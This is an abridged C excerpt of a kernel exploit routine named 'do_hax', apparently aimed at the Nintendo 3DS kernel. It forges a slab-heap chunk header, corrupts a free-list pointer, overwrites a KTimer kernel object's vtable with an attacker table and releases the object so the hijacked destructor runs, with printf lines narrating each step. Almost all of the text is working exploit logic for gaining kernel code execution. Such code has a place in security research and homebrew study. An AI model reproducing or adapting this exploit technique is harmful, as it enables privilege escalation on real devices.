...
void do_hax() {
    ...
    Handle timer, dummyTimer;
    u32 timerAddr;
	//svcCreateTimer(&dummyTimer, 0);
    ...
    MemChunkHdr* fakeHdr = (MemChunkHdr*) ((((timerAddr - 4) + 0x24) & 0xFFFF) | SLABHEAP_PHYSICAL );
    ...
    ((MemChunkHdr*) memAddr)->next = (u32)fakeHdr - KERNEL_SHIFT;
    ...
    //memcpy((void*) (memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF)), backup, 0x100);
	
    // Be sure that the mem area is accessible
	KTimer* mappedTimerObj = (KTimer*) (memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF));
	wait_raw_mapped((u32)mappedTimerObj);
    
	// Gonna hack and repair a bit our dear kobject
	printf("Overwrite vtable at 0x%08X...\n", (int)mappedTimerObj);
	mappedTimerObj->vtable = &vTable[0];
	mappedTimerObj->owner = *(u32*)(memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF) - 4);
	
	// Releasing the edited kobject will call the destructor in his vtable, which has been edited by us
	printf("Release it!\n");
